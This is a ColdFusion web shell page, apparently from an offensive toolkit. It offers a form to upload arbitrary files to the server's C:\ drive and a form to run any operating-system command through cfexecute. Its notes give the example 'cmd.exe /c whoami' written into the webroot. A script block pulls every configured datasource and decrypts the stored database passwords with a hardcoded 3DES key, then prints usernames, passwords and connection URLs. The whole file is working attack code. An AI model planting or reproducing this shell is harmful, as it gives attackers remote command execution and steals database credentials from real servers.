<html>
<body>

<!-- orig author: kGrutzmacher  -->
<!-- additshonz: lawKnee        -->

<b>Notes:</b><br>
<ul>
<li>Ccommand "c:\windows\system32\cmd.exe" or wherever cmd.exe is</li>
<li>Options " /c whoami > c:\Inetpub\wwwroot\output.txt"</li>
</ul>

<p>

<cfoutput>

<cfif isDefined("fileUpload")>
  <cffile action="upload"
    fileField="fileUpload"
    destination="C:\">
     <p>Your file has been uploaded.</p>
</cfif>
<form enctype="multipart/form-data" method="post">
<input type="file" name="fileUpload" /><br />
<input type="submit" value="Upload File" />
</form>


<table>
<form method="POST" action="">
<tr><td>Command:</td><td><input type=text name="cmd" size=50
 <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
<tr><td>Options:</td><td> <input type=text name="opts" size=50
 <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
<tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
 <cfif isdefined("form.timeout")>value="#form.timeout#"
 <cfelse>value="5"</cfif>></td></tr>
</table>
<input type=submit value="Exec" >
</form>

<cfif isdefined("form.cmd")>
<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#"
  arguments = "#Form.opts#"
  timeout = "#Form.timeout#">
</cfexecute>
</cfsavecontent>
<pre>
#HTMLCodeFormat(myVar)#
</pre>
</cfif>

<cfscript>
//The following code borrowed from hernanOchoa @hexale (thx)  
//added better formatting on output and connection string [lb]

// Create Data Source Object
dataSourceObb=createobject("java","coldfusion.server.ServiceFactory").
        getDatasourceService().getDatasources();
        writeoutput("<br><br><b>Datasource Credentials:</b><br>");
        writeoutput("<table>");
// Loop Through DataSources
for(i in dataSourceObb) {
        if(len(dataSourceObb[i]["password"])){

        // Get url
        theurl=(dataSourceObb[i]["url"]);

        // Get username
        username=(dataSourceObb[i]["username"]);

        // Get and decrypt password
        decryptPassword=Decrypt(dataSourceObb[i]["password"],
        generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede",
     "Base64");

        // Output datasource usernames, passwords, and urls
        writeoutput("" &
        "<tr><td>DataSource: " & i & "</td>" &
        "<td>Username: " & username & "</td>" &
        "<td>Password: " & decryptPassword &
        "<td>URL: " & theurl & "</td></tr>");
        }
}
writeoutput("</table><br>");
</cfscript>
</cfoutput>
</body>
</html>
